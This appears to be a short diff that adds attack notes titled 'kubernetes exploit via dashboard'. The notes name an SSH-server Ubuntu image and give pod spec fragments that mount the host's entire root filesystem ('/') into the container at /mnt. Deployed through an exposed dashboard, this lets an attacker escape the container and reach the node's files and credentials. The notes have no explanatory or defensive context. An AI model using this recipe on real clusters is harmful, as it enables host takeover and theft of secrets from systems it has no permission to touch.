@@ -1,0 +1,6 @@
+kubernetes exploit via dashboard
+image : rastasheep/ubuntu-sshd
+
+"volumes": [ { "name": "test", "hostPath": { "path": "/", "type": "" } } ],
+
+"volumeMounts": [ { "name": "test", "mountPath": "/mnt" } ],
